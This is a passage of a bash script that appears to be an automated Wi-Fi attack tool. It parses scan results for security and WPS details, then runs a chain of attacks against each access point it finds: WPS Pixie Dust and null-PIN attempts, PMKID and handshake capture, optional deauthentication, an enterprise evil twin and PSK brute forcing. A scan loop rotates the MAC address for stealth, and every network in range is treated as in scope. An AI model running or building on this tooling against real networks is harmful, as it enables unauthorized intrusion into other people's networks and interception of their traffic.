ln=$0; sub(/.*[Gg]roup [Mm]gmt [Cc]ipher:[[:space:]]*/,"",ln); gsub(/,/," ",ln)
n=split(ln,a,/[[:space:]]+/); for(i=1;i<=n;i++)cipher_add("gm",a[i])
}
in_rsn&&/[Gg]roup [Mm]anagement [Cc]ipher:/{
ln=$0; sub(/.*[Gg]roup [Mm]anagement [Cc]ipher:[[:space:]]*/,"",ln); gsub(/,/," ",ln)
n=split(ln,a,/[[:space:]]+/); for(i=1;i<=n;i++)cipher_add("gm",a[i])
}
in_rsn&&/[Gg]roup [Cc]ipher:/{
ln=$0; sub(/.*[Gg]roup [Cc]ipher:[[:space:]]*/,"",ln); gsub(/,/," ",ln)
n=split(ln,a,/[[:space:]]+/); for(i=1;i<=n;i++)cipher_add("gw",a[i])
}
in_rsn&&/[Pp]airwise [Cc]iphers:/{
ln=$0; sub(/.*[Pp]airwise [Cc]iphers:[[:space:]]*/,"",ln); gsub(/,/," ",ln)
n=split(ln,a,/[[:space:]]+/); for(i=1;i<=n;i++)cipher_add("pw",a[i])
}
/[Ss]etup [Ll]ocked:[[:space:]]*0x0*[1-9a-fA-F]/{ap_locked="YES"}
/[Ss]elected [Rr]egistrar:[[:space:]]*0x0*[1-9a-fA-F]/{sel_reg="YES"}
in_rsn&&/Authentication suites:/{
ln=$0
sub(/.*[Aa]uthentication [Ss]uites:[[:space:]]*/,"",ln)
gsub(/,/," ",ln)
n=split(ln,a,/[[:space:]]+/)
for(i=1;i<=n;i++){
t=a[i]
if(t=="")continue
if((t=="IEEE"||t=="ieee")&&i<n&&(a[i+1]=="802.1X"||a[i+1]=="802.1x")){akm_add("802.1X");i++;continue}
if(t=="802.1X"||t=="802.1x"){akm_add("802.1X");continue}
if(t=="FT-802.1X"||t=="FT-802.1x"||t=="FT/802.1X"||t=="FT/802.1x"){akm_add("FT-802.1X");continue}
if(t=="FT-PSK"){akm_add("FT-PSK");continue}
if(t=="FT-SAE"){akm_add("FT-SAE");continue}
if(t=="SAE-EXT-KEY"){akm_add("SAE-EXT-KEY");continue}
if(t=="PSK-SHA256"){akm_add("PSK-SHA256");continue}
if(t=="FILS-SHA256"||t=="FILS-SHA384"){akm_add(t);continue}
if(t=="FT-FILS-SHA256"||t=="FT-FILS-SHA384"){akm_add(t);continue}
if(t=="OWE"){akm_add("OWE");owe="YES";continue}
if(t=="SAE"){akm_add("SAE");wpa3="YES";continue}
if(t=="PSK"){akm_add("PSK");psk="YES";continue}
}
}
/^[\t ]*HE [Cc]apabilities:/{
in_he_cap=1; in_he_op=0; in_rsn=0; in_rsnxe=0; in_extcap=0; in_legacy_wpa=0; in_wps=0
he_capabilities_present="YES"; he_present="YES"
next
}
/^[\t ]*HE [Oo]peration:/{
in_he_op=1; in_he_cap=0; in_rsn=0; in_rsnxe=0; in_extcap=0; in_legacy_wpa=0; in_wps=0
he_operation_present="YES"; he_present="YES"
next
}
/^\t[A-Za-z]/&&!/^\tHE /&&!/^\tEHT /{
in_he_cap=0; in_he_op=0
}
in_he_cap&&/HE MAC Capabilities[[:space:]]*\(/ {
ln=$0
if(match(ln,/0[xX][0-9a-fA-F]+/)){he_mac_hex=tolower(substr(ln,RSTART,RLENGTH)); if(he_mac_hex!~/^0x/)he_mac_hex="0x" he_mac_hex}
}
in_he_cap&&/HE PHY Capabilities:[[:space:]]*\(/ {
ln=$0
if(match(ln,/0[xX][0-9a-fA-F]+/)){he_phy_hex=tolower(substr(ln,RSTART,RLENGTH)); if(he_phy_hex!~/^0x/)he_phy_hex="0x" he_phy_hex}
}
in_he_cap&&/[Tt]WT[ _][Rr]equest|[Tt]WT[ _][Rr]espond|[Tt]WT[ _][Rr]equired/{he_twt_supported="YES"}
in_he_cap&&/[Uu][Ll][[:space:]].*[Mm][Uu]-[Mm][Ii][Mm][Oo]|[Ff]ull [Bb]andwidth [Uu][Ll] [Mm][Uu]|[Pp]artial [Bb]andwidth [Uu][Ll] [Mm][Uu]/{he_ul_mu_mimo="YES"}
in_he_cap&&/[Dd][Ll][[:space:]].*[Mm][Uu]-[Mm][Ii][Mm][Oo]|[Mm][Uu] [Bb]eamformer|[Mm][Uu]-[Mm][Ii][Mm][Oo] [Bb]eamform/{he_dl_mu_mimo="YES"}
in_he_cap&&/[Oo][Ff][Dd][Mm][Aa][ _][Rr][Aa]|[Uu][Ll][ _][Oo][Ff][Dd][Mm][Aa]|[Uu]plink [Oo][Ff][Dd][Mm][Aa]/{he_ul_ofdma="YES"}
in_he_cap&&/[Dd][Ll][ _][Oo][Ff][Dd][Mm][Aa]|[Dd]ownlink [Oo][Ff][Dd][Mm][Aa]/{he_dl_ofdma="YES"}
in_he_cap&&/HE160|160[ ]*[Mm][Hh][Zz]/{he_160mhz="YES"}
in_he_cap&&/80\+80|HE80\+80/{he_80p80="YES"}
in_he_cap&&/[0-9]+[[:space:]]+streams:/{
ln=$0
if(ln~/not supported/)next
if(match(ln,/[0-9]+[[:space:]]+streams:/)){
s=substr(ln,RSTART,RLENGTH); gsub(/[^0-9]/,"",s); n=s+0
if(n>he_ss_max)he_ss_max=n
}
}
in_he_op&&/BSS[ _][Cc]olor:/{
ln=$0; sub(/.*[Bb][Ss][Ss][ _][Cc]olor:[[:space:]]*/,"",ln)
split(ln,a,/[^0-9]+/); if(a[1]!="")he_bss_color=a[1]
}
in_he_op&&/[Tt]WT[ _][Rr]equired/{he_twt_supported="YES"}
/^[\t ]*EHT [Cc]apabilities:/{
in_eht_cap=1; in_eht_op=0; in_he_cap=0; in_he_op=0; in_rsn=0; in_rsnxe=0; in_extcap=0; in_legacy_wpa=0; in_wps=0
eht_capabilities_present="YES"; eht_present="YES"
next
}
/^[\t ]*EHT [Oo]peration:/{
in_eht_op=1; in_eht_cap=0; in_he_cap=0; in_he_op=0; in_rsn=0; in_rsnxe=0; in_extcap=0; in_legacy_wpa=0; in_wps=0
eht_operation_present="YES"; eht_present="YES"
next
}
/^[\t ]*Multi-[Ll]ink:/{
in_eht_cap=0; in_eht_op=0
eht_mlo_supported="YES"; eht_mlo_ap="YES"; eht_present="YES"
next
}
/^\t[A-Za-z]/&&!/^\tEHT /&&!/^\tMulti-[Ll]ink/{
in_eht_cap=0; in_eht_op=0
}
in_eht_cap&&/EHT MAC Capabilities[[:space:]]*\(/ {
ln=$0
if(match(ln,/0[xX][0-9a-fA-F]+/)){eht_mac_hex=tolower(substr(ln,RSTART,RLENGTH)); if(eht_mac_hex!~/^0x/)eht_mac_hex="0x" eht_mac_hex}
}
in_eht_cap&&/EHT PHY Capabilities[[:space:]]*\(/ {
ln=$0
if(match(ln,/0[xX][0-9a-fA-F]+/)){eht_phy_hex=tolower(substr(ln,RSTART,RLENGTH)); if(eht_phy_hex!~/^0x/)eht_phy_hex="0x" eht_phy_hex}
}
(in_eht_cap||in_eht_op)&&/320[[:space:]]*[Mm][Hh][Zz]|EHT320|320MHz/{eht_320mhz="YES"}
(in_eht_cap||in_eht_op)&&/[Pp]unctur/{eht_puncturing_supported="YES"}
in_eht_cap&&/[Mm]ulti-[Ll]ink|[Mm][Ll][Oo]|[Mm][Ll][Dd]/{eht_mlo_supported="YES"}
in_eht_cap&&/[0-9]+[[:space:]]+streams:/{
ln=$0
if(ln~/not supported/)next
if(match(ln,/[0-9]+[[:space:]]+streams:/)){
s=substr(ln,RSTART,RLENGTH); gsub(/[^0-9]/,"",s); n=s+0
if(n>eht_ss_max)eht_ss_max=n
}
}
in_eht_cap&&/NSS[[:space:]]*=[[:space:]]*[0-9]+/{
ln=$0
while(match(ln,/NSS[[:space:]]*=[[:space:]]*[0-9]+/)){
s=substr(ln,RSTART,RLENGTH); gsub(/[^0-9]/,"",s); n=s+0
if(n>eht_ss_max)eht_ss_max=n
ln=substr(ln,RSTART+RLENGTH)
}
}
in_eht_cap&&/MCS[[:space:]]*[0-9]+/{
ln=$0
while(match(ln,/MCS[[:space:]]*[0-9]+(-[0-9]+)?/)){
s=substr(ln,RSTART,RLENGTH)
if(match(s,/[0-9]+$/)){n=substr(s,RSTART,RLENGTH)+0; if(n>eht_mcs_hi)eht_mcs_hi=n}
ln=substr(ln,RSTART+RLENGTH)
}
}
in_eht_op&&/320[[:space:]]*[Mm][Hh][Zz]|channel width:[[:space:]]*320/{eht_320mhz="YES"}
in_eht_op&&/[Dd]isabled [Ss]ubchannel|[Pp]unctur/{eht_puncturing_supported="YES"}
/OWE[[:space:]]+[Tt]ransition[[:space:]]+[Mm]ode/{owe_tm="YES"}
/Transition[[:space:]]+[Dd]isable/{
rsnxe_add("Trans-Disable")
if(match($0,/0[xX][0-9a-fA-F]+/)){
td_bitmap=substr($0,RSTART,RLENGTH)
}
}
/50:6[fF]:9[aA]:20/||/50-6[fF]-9[aA]-20/{
rsnxe_add("Trans-Disable")
if(td_bitmap=="" && match($0,/0[xX][0-9a-fA-F]+/)) td_bitmap=substr($0,RSTART,RLENGTH)
}
/MFP-REQUIRED|MFPR/{pmf="REQUIRED"}
/(MFP-CAPABLE|MFPC)/&&pmf=="NO"{pmf="CAPABLE"}
/Wi-Fi Easy Connect|Device Provisioning Protocol|DPP|50:6f:9a/{dpp="YES";dpp_on=1}
dpp_on&&/DPP [Vv]ersion/&&match($0,/[0-9]+(\.[0-9]+)?/){dpp_ver=substr($0,RSTART,RLENGTH)}
dpp_on&&/[Cc]onfigurator/{dpp_conf="YES"}
dpp_on&&/PKEX/{dpp_pkex="YES"}
/[Mm]anufacturer:/{ln=$0;sub(/.*[Mm]anufacturer:[[:space:]]*/,"",ln);ln=trimfield(ln);if(ln!="")maker=ln}
/[Mm]odel:/{ln=$0;sub(/.*[Mm]odel:[[:space:]]*/,"",ln);ln=trimfield(ln);if(ln!="")model=ln}
/[Dd]evice [Nn]ame:/{ln=$0;sub(/.*[Dd]evice [Nn]ame:[[:space:]]*/,"",ln);ln=trimfield(ln);if(ln!="")devname=ln}
/[Ss]erial [Nn]umber:/{ln=$0;sub(/.*[Ss]erial [Nn]umber:[[:space:]]*/,"",ln);ln=trimfield(ln);if(ln!="")serial=ln}
/[Ff]irmware [Vv]ersion:/{ln=$0;sub(/.*[Ff]irmware [Vv]ersion:[[:space:]]*/,"",ln);ln=trimfield(ln);if(ln!="")fw=ln}
/UUID:/{ln=$0;sub(/.*UUID:[[:space:]]*/,"",ln);ln=trimfield(ln);if(ln!="")uuid=ln}
END{
emit()
n=0
for(b in best){n++;ord[n]=b}
if(n>1){
for(i=1;i<=n;i++)for(j=i+1;j<=n;j++)if(bestsig[ord[j]]>bestsig[ord[i]]){t=ord[i];ord[i]=ord[j];ord[j]=t}
}
for(i=1;i<=n;i++)print best[ord[i]]
}
' "$raw" >"$out" 2>/dev/null || {
		: >"$out" 2>/dev/null || true
		return 1
	}
	return 0
}

readonly RET_SUCCESS=0
readonly RET_LOCKOUT=1
readonly RET_FAILED=2
readonly RET_SKIPPED=3
readonly RET_ERROR=4

process_target() {
	local b essid sig ver channel ap_locked sel_reg wpa3 pmf dpp wps_hidden wps_state cfg_methods
	local tkip wpa1 dpp_ver dpp_conf dpp_pkex psk dpid maker model fw devname serial uuid
	local extra_info dpp_vulns cves pin_known _oui _cm cm_val skip_default_pin fn lk safe_essid
	local chip_family vendor_lock pmf_mode akm monitor_chain rsn_caps akm_list wpa3_tm rsn_gw rsn_pw rsn_gm rsnxe_list extcap_list owe_tm td_bitmap transition_disable rsnxe_cap_hex wpa3_mode pmf_grade
	local hidden_pin_candidate cfg_methods_no_pin_display
	local he_present he_capabilities_present he_operation_present he_bss_color he_twt_supported
	local he_ul_mu_mimo he_dl_mu_mimo he_ul_ofdma he_dl_ofdma he_160mhz he_80p80 he_spatial_streams he_raw_capabilities_hex
	local eht_present eht_capabilities_present eht_operation_present eht_320mhz eht_puncturing_supported
	local eht_mlo_supported eht_mlo_ap eht_spatial_streams eht_mcs_max eht_raw_capabilities_hex
      local dump_pid=""  

	b=${1:-}
	essid=${2:-}
	sig=${3:-0}
	ver=${4:-?}
	channel=${5:-1}
	ap_locked=${6:-NO}
	sel_reg=${7:-NO}
	wpa3=${8:-NO}
	pmf=${9:-NO}
	dpp=${10:-NO}
	wps_hidden=${11:-NO}
	wps_state=${12:-unknown}
	cfg_methods=${13:-0x0000}
	tkip=${14:-NO}
	wpa1=${15:-NO}
	dpp_ver=${16:-unknown}
	dpp_conf=${17:-NO}
	dpp_pkex=${18:-NO}
	psk=${19:-NO}
	dpid=${21:-unknown}
	maker=${22:-}
	model=${23:-}
	fw=${24:-}
	devname=${25:-}
	serial=${26:-}
	uuid=${27:-}
	rsn_caps=${28:-NO}
	akm_list=${29:-}
	rsn_gw=${30:-}
	rsn_pw=${31:-}
	rsn_gm=${32:-}
	rsnxe_list=${33:-}
	extcap_list=${34:-}
	owe_tm=${35:-NO}
	td_bitmap=${36:-}
	rsnxe_cap_hex=${37:-}
	he_present=${38:-}
	he_capabilities_present=${39:-}
	he_operation_present=${40:-}
	he_bss_color=${41:-}
	he_twt_supported=${42:-}
	he_ul_mu_mimo=${43:-}
	he_dl_mu_mimo=${44:-}
	he_ul_ofdma=${45:-}
	he_dl_ofdma=${46:-}
	he_160mhz=${47:-}
	he_80p80=${48:-}
	he_spatial_streams=${49:-}
	he_raw_capabilities_hex=${50:-}
	eht_present=${51:-}
	eht_capabilities_present=${52:-}
	eht_operation_present=${53:-}
	eht_320mhz=${54:-}
	eht_puncturing_supported=${55:-}
	eht_mlo_supported=${56:-}
	eht_mlo_ap=${57:-}
	eht_spatial_streams=${58:-}
	eht_mcs_max=${59:-}
	eht_raw_capabilities_hex=${60:-}

	transition_disable="UNKNOWN"
	extra_info=""
	dpp_vulns=""
	cves=""
	pin_known=0
	hidden_pin_candidate=0
	cfg_methods_no_pin_display=0
	_oui=""
	_cm=""
	cm_val=0
	skip_default_pin=0
	fn=""
	lk=""
	safe_essid=""
	chip_family=""
	vendor_lock=""
	pmf_mode="?"
	akm=""
	monitor_chain=""

	if [ -z "$b" ]; then
		print_log ERROR INPUT "No BSSID"
		return "$RET_SKIPPED"
	fi
	b="${b#"${b%%[![:space:]]*}"}"
	b="${b%"${b##*[![:space:]]}"}"
	local _b_norm
	if _b_norm=$(normalize_bssid "$b" 2>/dev/null) && [ -n "$_b_norm" ]; then b="$_b_norm"; fi
	if ! check_bssid "$b"; then
		print_log ERROR INPUT "Bad BSSID: [${b}] (len=${#b})"
		return "$RET_SKIPPED"
	fi

	if [[ "${SKIP_PROCESSED:-1}" == "1" ]]; then
		if [[ -n "${SESSION_PROCESSED["$b"]:-}" ]] || is_processed "$b"; then
			print_log INFO SKIP "$b done"
			return "$RET_SKIPPED"
		fi
	fi
	SESSION_PROCESSED["$b"]=1
	mark_processed "$b"
	if [[ "${SKIP_PROCESSED:-1}" == "1" ]] && already_known "$b"; then
		print_log INFO SKIP "$b known"
		return "$RET_SKIPPED"
	fi

	case "$channel" in '' | *[!0-9]*) channel=1 ;; esac
	[ -z "$essid" ] && essid="<hidden>"
	[ -z "$sig" ] && sig="0"
	CUR_ESSID="$essid"
	CUR_VER="$ver"
	CUR_CHANNEL="$channel"
	CUR_CHIP=$(get_chip "$b" 2>/dev/null) || CUR_CHIP="n/a"
	[ -z "$CUR_CHIP" ] && CUR_CHIP="n/a"
	[ -z "$dpid" ] && dpid="unknown"

	case "$dpid" in
	user)
		skip_default_pin=1
		print_log INFO SKIP "$b needs PIN"
		;;
	pushbutton) print_log WARN DOWNGRADE "$b button-only" ;;
	esac

	cves=$(get_cves "$CUR_CHIP" 2>/dev/null) || cves=""

	if [ "$dpp" = "YES" ]; then
		dpp_vulns=$(detect_dpp_vulns "$b" "$dpp_ver" "$dpp_conf" "$dpp_pkex" "${maker:-}" "${model:-}" "${fw:-}" 2>/dev/null) || dpp_vulns=""
	fi

	case "$pmf" in
	REQUIRED) pmf_mode="req" ;;
	CAPABLE) pmf_mode="opt" ;;
	NO)
		case "$wpa3" in
		YES) ;;
		*)
			case "$rsn_caps" in
			YES) pmf_mode="not-ad" ;;
			*) pmf_mode="?" ;;
			esac
			;;
		esac
		;;
	esac

	akm="$akm_list"
	[ -z "$akm" ] && akm="?"

	wpa3_tm=0
	case ",${akm_list}," in
	*,SAE,*)
		case ",${akm_list}," in
		*,PSK,*) wpa3_tm=1 ;;
		esac
		;;
	esac

	wpa3_mode="unknown"
	case "$wpa3_tm" in
	1) wpa3_mode="transition" ;;
	*)
		case ",${akm_list}," in
		*,SAE,*)
			case ",${akm_list}," in
			*,PSK,*)
				wpa3_mode="transition"
				wpa3_tm=1
				;;
			*) wpa3_mode="sae-only" ;;
			esac
			;;
		esac
		;;
	esac

	CUR_WPA3_TM=0
	if [[ "$wpa3_tm" == "1" && "${ENABLE_WPA3_TM_DOWNGRADE:-1}" == "1" ]]; then
		CUR_WPA3_TM=1
		print_log INFO WPA3TM "$b transition mode"
	fi

	pmf_grade="unknown"
	case "$wpa3" in YES)
		case "$pmf_mode" in
		req) pmf_grade="pass" ;;
		opt) pmf_grade="warn" ;;
		not-ad | '?' | '') pmf_grade="fail" ;;
		esac
		;;
	*)
		case ",${akm_list}," in
		*,SAE,* | *,FT-SAE,* | *,SAE-EXT-KEY,*)
			case "$pmf_mode" in
			req) pmf_grade="pass" ;;
			opt) pmf_grade="warn" ;;
			not-ad | '?' | '') pmf_grade="fail" ;;
			esac
			;;
		*)
			case "$pmf_mode" in
			req) pmf_grade="pass" ;;
			opt) pmf_grade="warn" ;;
			esac
			;;
		esac
		;;
	esac

	if [[ -z "${rsnxe_cap_hex:-}" && -n "${rsnxe_list:-}" ]]; then
		local _tok _rest_rsnxe="$rsnxe_list"
		while [[ -n "$_rest_rsnxe" ]]; do
			_tok="${_rest_rsnxe%%,*}"
			_rest_rsnxe="${_rest_rsnxe#"$_tok"}"
			_rest_rsnxe="${_rest_rsnxe#,}"
			case "$_tok" in
			CAP:0x* | CAP:0X*)
				rsnxe_cap_hex="${_tok#CAP:}"
				rsnxe_cap_hex="${rsnxe_cap_hex,,}"
				[[ "$rsnxe_cap_hex" == 0x* ]] || rsnxe_cap_hex="0x${rsnxe_cap_hex}"
				break
				;;
			esac
		done
	fi

	transition_disable="UNKNOWN"
	case ",${rsnxe_list}," in
	*,Trans-Disable,*) transition_disable="YES" ;;
	esac
	if [[ -n "$td_bitmap" ]]; then
		case "${td_bitmap,,}" in
		0x0 | 0x00 | 0x0000 | 0) transition_disable="NO" ;;
		*) transition_disable="YES" ;;
		esac
	fi

	case "$wpa3" in YES) extra_info="${extra_info} WPA3" ;; esac
	case "$wpa3_tm" in 1) extra_info="${extra_info} WPA3-TM" ;; esac
	case "$transition_disable" in YES) extra_info="${extra_info} TD" ;; NO) extra_info="${extra_info} NO-TD" ;; esac

	case ",${akm_list}," in
	*,OWE,*)
		case "$owe_tm" in YES) extra_info="${extra_info} OWE-TM" ;; esac
		;;
	esac

	extra_info="${extra_info} PMF:${pmf_mode} AKM:${akm}"
	[ -n "$rsn_gw" ] && extra_info="${extra_info} RSN-GW:${rsn_gw}"
	[ -n "$rsn_pw" ] && extra_info="${extra_info} RSN-PW:${rsn_pw}"
	[ -n "$rsn_gm" ] && extra_info="${extra_info} RSN-GM:${rsn_gm}"
	[ -n "$rsnxe_list" ] && extra_info="${extra_info} RSNXE:${rsnxe_list}"
	[ -n "$extcap_list" ] && extra_info="${extra_info} EXT-CAP:${extcap_list}"

	case "$dpp" in YES) extra_info="${extra_info} DPP(v${dpp_ver:-?})" ;; esac
	case "$dpp_conf" in YES) extra_info="${extra_info} DPP-Configurator" ;; esac
	case "$dpp_pkex" in YES) extra_info="${extra_info} DPP-PKEX" ;; esac
	[ -n "$dpp_vulns" ] && extra_info="${extra_info} DPP-VULN:${dpp_vulns}"

	case "$wps_hidden" in YES) extra_info="${extra_info} HiddenWPS" ;; esac
	case "$dpid" in
	user) extra_info="${extra_info} UserPIN" ;;
	pushbutton) extra_info="${extra_info} PBC-only" ;;
	esac

	_oui=$(normalize_oui "$b" 2>/dev/null) || _oui=""
	[ -n "${KNOWN_PINS_DB["$_oui"]:-}" ] && pin_known=1

	if [ "$wps_state" = "configured" ] && [ "$pin_known" -eq 0 ]; then
		if ! pin_from_mac "$b" >/dev/null 2>&1 && ! easybox_pin "$b" >/dev/null 2>&1; then
			extra_info="${extra_info} HIDDEN_PIN_CANDIDATE"
			hidden_pin_candidate=1
		fi
	fi

	_cm="${cfg_methods:-0x0000}"
	_cm="${_cm#0x}"
	_cm="${_cm#0X}"
	case "$_cm" in
	"" | *[!0-9a-fA-F]*) _cm="0" ;;
	esac

	if [ -n "$wps_state" ] && [ "$wps_state" != "unknown" ]; then
		cm_val=0
		cm_val=$((16#${_cm})) || cm_val=0
		if [ $((cm_val & 0x000C)) -eq 0 ]; then
			extra_info="${extra_info} -"
			cfg_methods_no_pin_display=1
		fi
	fi

	if [ "$tkip" = "YES" ] || [ "$wpa1" = "YES" ]; then
		extra_info="${extra_info}TKIP/WPA1"
	fi

	print_log NET FOUND "$essid | $b | ${sig}dBm "
	log_target_detail "$b" "$essid" "$sig" "${ver:-?}" "$CUR_CHIP" "${cves:-none}" "$pmf_mode" "$akm"

	safe_essid="${essid//|/\\|}"
	if [[ -z "${FOUND_SEEN["$b"]:-}" ]]; then
		FOUND_SEEN["$b"]=1
		FOUND_TARGETS+=("$b|$safe_essid|$sig|${ver:-?}|$CUR_CHIP|${cves:-}|${dpp_ver:-}|${dpp_conf:-}|${dpp_pkex:-}|${wps_state:-}|${cfg_methods:-}|${tkip:-}|${wpa1:-}|${extra_info:-}")
	fi

	[ -n "$cves" ] && print_log VULN CVE "$b CVE: $cves"

	save_registrar "$b" "$essid" "$CUR_CHIP" "${ver:-NA}" "${maker:-}" "${model:-}" "${devname:-}" "${serial:-}" "${fw:-}" "${uuid:-}" 2>/dev/null || true

	sar_store_record "$b" "$essid" "$sig" "$channel" "$CUR_CHIP" "${cves:-}" \
		"${ver:-?}" "${wps_state:-}" "${dpid:-}" "${cfg_methods:-}" \
		"${wps_hidden:-NO}" "${sel_reg:-NO}" \
		"${maker:-}" "${model:-}" "${devname:-}" "${serial:-}" "${fw:-}" "${uuid:-}" \
		"${pmf:-NO}" "${pmf_mode:-?}" "${rsn_caps:-NO}" "${akm:-?}" \
		"${wpa3:-NO}" "${wpa3_tm:-0}" "${owe_tm:-NO}" \
		"${rsn_gw:-}" "${rsn_pw:-}" "${rsn_gm:-}" "${rsnxe_list:-}" "${extcap_list:-}" \
		"${tkip:-NO}" "${wpa1:-NO}" \
		"${dpp:-NO}" "${dpp_ver:-}" "${dpp_conf:-NO}" "${dpp_pkex:-NO}" "${dpp_vulns:-}" \
		"${pin_known:-0}" "${hidden_pin_candidate:-0}" "${cfg_methods_no_pin_display:-0}" \
		"${transition_disable:-UNKNOWN}" "${td_bitmap:-}" "${rsnxe_cap_hex:-}" "${wpa3_mode:-unknown}" "${pmf_grade:-unknown}" \
		"${he_present:-}" "${he_capabilities_present:-}" "${he_operation_present:-}" \
		"${he_bss_color:-}" "${he_twt_supported:-}" "${he_ul_mu_mimo:-}" "${he_dl_mu_mimo:-}" \
		"${he_ul_ofdma:-}" "${he_dl_ofdma:-}" "${he_160mhz:-}" "${he_80p80:-}" \
		"${he_spatial_streams:-}" "${he_raw_capabilities_hex:-}" \
		"${eht_present:-}" "${eht_capabilities_present:-}" "${eht_operation_present:-}" \
		"${eht_320mhz:-}" "${eht_puncturing_supported:-}" "${eht_mlo_supported:-}" "${eht_mlo_ap:-}" \
		"${eht_spatial_streams:-}" "${eht_mcs_max:-}" "${eht_raw_capabilities_hex:-}" \
		2>/dev/null || true

	if [[ "${ENABLE_MOBILE_REEVAL:-1}" == "1" ]]; then
		local _reeval_file="${TMP_DIR:-/tmp}/reeval_baseline.txt"
		local _reeval_now_w
		_reeval_now_w="$(date +%s)"
		if [[ ! -f "$_reeval_file" ]]; then : >"$_reeval_file" 2>/dev/null || true; fi
		local _reeval_tmp
		_reeval_tmp=$(mktemp "${_reeval_file}.tmp.XXXXXX") || return 1
		{
			flock -x 200
			awk -v key="$b" -v sig="${sig:-0}" -v ts="$_reeval_now_w" '
                $1==key{found=1;print key,sig,ts;next}{print} END{if(!found)print key,sig,ts}
            ' "$_reeval_file" >"$_reeval_tmp"
			mv -f "$_reeval_tmp" "$_reeval_file" || { rm -f "$_reeval_tmp"; }
		} 200>"${_reeval_file}.lock"
	fi

	
	local _nb_scope
	_nb_scope=$(normalize_bssid "$b" 2>/dev/null) || _nb_scope=""
	[[ -n "$_nb_scope" ]] && IN_SCOPE_BSSIDS["$_nb_scope"]=1

	if [ "${ENABLE_DPP_SNIFF:-1}" = "1" ] && [ "$dpp" = "YES" ] && [ -n "$channel" ] && [ "$channel" != "0" ]; then
		if [ -n "$dpp_vulns" ] || [ "$dpp_conf" = "YES" ] || [ "$dpp_pkex" = "YES" ]; then
			dpp_sniff_monitor "$b" "$channel" || true
		fi
	fi

	case "${CUR_CHIP,,}" in
	*ralink* | *rt[0-9]*) chip_family="ralink" ;;
	*realtek* | *rtl[0-9]*) chip_family="realtek" ;;
	*atheros* | *ath[0-9]*) chip_family="atheros" ;;
	*broadcom* | *bcm[0-9]*) chip_family="broadcom" ;;
	*qualcomm* | *qca[0-9]*) chip_family="qualcomm" ;;
	*marvell* | *mwl[0-9]*) chip_family="marvell" ;;
	*) chip_family="N/A" ;;
	esac

	monitor_chain=""
	if [ "$skip_default_pin" -eq 1 ]; then
		monitor_chain="attack_user_pin attack_pixie"
	else
		monitor_chain="attack_pixie"
		case "$ver" in
		1.0 | 2.*) monitor_chain="$monitor_chain attack_null attack_empty" ;;
		*)
			if [ "$chip_family" != "N/A" ]; then
				monitor_chain="$monitor_chain attack_null attack_empty"
			fi
			;;
		esac
	fi

	if [[ "${ENABLE_PMKID:-1}" == "1" ]]; then
		monitor_chain="$monitor_chain attack_pmkid"
	fi
	if [[ "${ENABLE_PMKID_ACTIVE:-0}" == "1" ]]; then
		monitor_chain="$monitor_chain attack_pmkid_active"
	fi
	if [[ "${ENABLE_EAPOL_PASSIVE:-1}" == "1" ]]; then
		monitor_chain="$monitor_chain eapol_passive_capture"
	fi
	
	
	if [[ "${ENABLE_DEAUTH:-0}" == "1" ]]; then
		monitor_chain="$monitor_chain attack_deauth_handshake"
	fi

	if [ "$skip_default_pin" -eq 0 ]; then
		monitor_chain="$monitor_chain attack_vendor"
	fi

	if [ -n "$monitor_chain" ]; then
		if ! ensure_mode "monitor"; then
			print_log ERROR CHAIN "No monitor"
			return "$RET_ERROR"
		fi

		local -a _attack_fns=()
		IFS=' ' read -r -a _attack_fns <<<"$monitor_chain" || true
		local fn
		for fn in "${_attack_fns[@]}"; do
			[ -n "$fn" ] || continue
			VECTORS_RUN=$((${VECTORS_RUN:-0} + 1))
			if [ "$fn" = "attack_user_pin" ]; then
				if [ -z "${USER_PROVIDED_PIN:-}" ]; then
					print_log WARN CHAIN "No PIN set"
					continue
				fi
				if "$fn" "$b" "$CUR_CHIP" "$CUR_VER" "$USER_PROVIDED_PIN"; then
					print_log OK CHAIN "$fn OK on $b"
					ensure_mode "managed" || true
					return "$RET_SUCCESS"
				fi
			else
				if "$fn" "$b" "$CUR_CHIP" "$CUR_VER" "" "$chip_family"; then
					print_log OK CHAIN "$fn OK on $b"
					ensure_mode "managed" || true
					return "$RET_SUCCESS"
				fi
			fi


			if in_lockout "$b"; then
				lk=$(measure_lockout_strength "$b" "$channel" 2>/dev/null) || lk="unknown"
				[ "$lk" = "weak" ] && print_log VULN WEAKLOCK "$b weak lock"
				print_log WARN CHAIN "$b locked ($lk); stop"
				ensure_mode "managed" || true
				return "$RET_LOCKOUT"
			fi
		done
		ensure_mode "managed" || true
	fi

	
	wpa_audit_posture "$b" "${psk:-NO}" "${wpa3:-NO}" "${akm_list:-}" "${pmf_mode:-?}" || true

	
	if [[ "${ENABLE_WPA_AUDIT:-1}" == "1" && "${WPA_AUDIT_MODE,,}" == "external" ]]; then
		VECTORS_RUN=$((VECTORS_RUN + 1))
		wpa_audit_external_dispatch "$b" "$essid" "$channel" || true
	fi

	
	if [[ "${ENABLE_EVILTWIN:-1}" == "1" ]] && is_wpa_enterprise "${akm_list:-}"; then
		VECTORS_RUN=$((VECTORS_RUN + 1))
		attack_wpa_enterprise_eviltwin "$b" "$essid" "$channel" "${akm_list:-}" || true
	fi


	if [[ "${ENABLE_WPA_BRUTE:-1}" == "1" ]] && ! is_wpa_enterprise "${akm_list:-}" &&
		{ [[ "${psk:-NO}" == "YES" ]] || [[ ",${akm_list}," == *,PSK,* ]] || [[ ",${akm_list}," == *PSK-SHA256* ]]; }; then
		VECTORS_RUN=$((VECTORS_RUN + 1))
		attack_wpa_psk_brute "$b" "$essid" "$channel" "${akm_list:-}" || true
	fi

	return "$RET_FAILED"
}

function run_scan_loop() {
	while true; do
		SCAN_NUM=$((${SCAN_NUM:-0} + 1))
		audit_header "SCAN ROUND" "round : $SCAN_NUM" "time  : $(ts_now)"

		if [[ "${ENABLE_STEALTH_MAC:-1}" == "1" ]]; then
			ensure_mode "managed" 2>/dev/null || true
			stealth_mac_rotate || true
			sleep "${MAC_ROTATE_DELAY:-3}"
		fi

		: >"$SCAN_RAW" 2>/dev/null || true

		if [[ "${SCAN_24:-1}" == "1" ]]; then
			print_log INFO BAND "Scan 2.4 GHz"
			scan_band "2.4" || true
		fi
		if [[ "${SCAN_5:-0}" == "1" ]]; then
			print_log INFO BAND "Scan 5 GHz"
			scan_band "5" || true
		fi
		if [[ "${SCAN_6E:-0}" == "1" ]]; then
			print_log INFO BAND "Scan 6 GHz"
			scan_band "6E" || true
		fi

		local raw_size=0
		if [[ -f "$SCAN_RAW" ]]; then
			raw_size=$(wc -c <"$SCAN_RAW" 2>/dev/null) || raw_size=0
